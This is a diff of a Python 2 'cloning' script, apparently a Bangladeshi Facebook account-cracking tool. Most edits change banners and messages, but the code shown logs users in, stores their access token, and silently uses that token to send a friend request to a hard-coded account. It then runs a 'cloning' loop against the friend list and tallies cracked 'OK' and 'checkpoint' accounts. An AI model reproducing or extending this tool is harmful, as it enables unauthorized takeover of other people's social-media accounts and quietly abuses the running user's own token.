@@ -73,31 +73,32 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 
-\033[1;97m CEO- Muhammad Rafid  
-\033[1;92m      
-\033[1;97m - Updated ✔   
-\033[1;92m       
-\033[1;97m -😘 GIFT FOR Kamran BHAI😘
-\033[1;97m  
-                                                               
 
+\033[1;93m     _____            ______ _____ _____  
+\033[1;93m    |  __ \     /\   |  ____|_   _|  __ \   Author🤘 
+\033[1;93m    | |__) |   /  \  | |__    | | | |  | |
+\033[1;93m    |  _  /   / /\ \ |  __|   | | | |  | |
+\033[1;93m    | | \ \  / ____ \| |     _| |_| |__| |
+\033[1;93m    |_|  \_\/_/    \_\_|    |_____|_____/ 
+
+                                                           
 """
 
-jalan("\033[1;97m•◈•───────•◈  BD Hacker •◈•───────•◈•")  
+jalan("\033[1;97m•👇•───────•👉 Bangladeshi Hacker 👈•───────•◈👇•")  
 
 
-jalan("\033[1;96m•🇧🇩• Script from Bangladesh ")
-jalan("\033[1;96m•◈• Don't use your personal id")
-jalan("\033[1;96m•◈• For COVID-19,Wear Mask and Wash Your Hands After 20 minutes  ")
-jalan("\033[1;93m•◈ © 2020 Rafid Inc. Version- 3.0")
+jalan("\033[1;96m•💀• Use It For Education Purpose  ")
+jalan("\033[1;96m•⚠️• Don't use your personal id")
+jalan("\033[1;96m•😇• For COVID-19,Wear Mask and Wash Your Hands After 20 minutes  ")
+jalan("\033[1;93m•💥  © 2020 Rafid Inc. Version- 3.0")
  
 jalan("   \033[1;91m Author:MUHAMMAD RAFID  ")	
 jalan("   \033[1;91m From: Bangladesh  ")
 jalan("   \033[1;91m Notice: We are not responsible for your #HACKS  ")	
-jalan("   \033[1'91m For any issue contact with whatsapp :- +8801768015072 ")  
-jalan("   \033[1;93m Welcome to Rafid Creations ")
+jalan("   \033[1'91m For any issue contact me on  whatsapp :- +8801768015072 ")  
+jalan("   \033[1;93m Its a safe cloning Terminal")
 
-jalan("\033[1;97m•😎•────────•😎•\033[1;96mBD HACKER\033[1;96m•😎•────────•😎•")
+jalan("\033[1;97m•💋•──────────\033[1;96m\033[1;96m──────────•💋•")
 
 
 
@@ -167,19 +168,19 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.youtube.com/c/muhammadrafu')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;97m[!] There is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;97m[!] Your Account is on Checkpoint")
+			print("\n\033[1;97m[!] Your Account is on Security Locked")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;97mPassword/Email is wrong")
+			print("\n\033[1;97mPassword/Email maybe wrong")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -205,7 +206,7 @@ def menu():
 		sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;97mYour Account is on Checkpoint"
+		print"\033[1;97mYour Account is on Security Locked"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -319,15 +320,16 @@ def pilih_super():
 		pilih_super()
 
 	
-	print "\033[1;36;40m[✺] Total IDs : \033[1;97m"+str(len(id))
-	jalan('\033[1;34;40m[✺] Please Wait...')
+	print "\033[1;36;40m[✺] Total Friends : \033[1;97m"+str(len(id))
+	jalan('\033[1;34;40m[✺] Please Wait A Sec...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
 	print "   \033[1;31;48m●😘══════════════════◄►══════════════════😍●"
 
-	jalan('                    \033[1;97mWe start cloning please Wait...')
+	jalan('           \033[1;97mWe start cloning please Wait...')
+
 	print  "  \033[1;36;48m ●😍══════════════════◄►══════════════════😘●" 
 
 	def main(arg):
@@ -445,7 +447,7 @@ def pilih_super():
 	
 	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;97m....'
 	print "\033[1;32;40m[+] Total OK/\033[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
-	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
+	print '\033[1;34;40m[+] Thanks For Using It'
 	print """
 \033[1;31;40m ●════════════════════════◄►════════════════════════●
            """
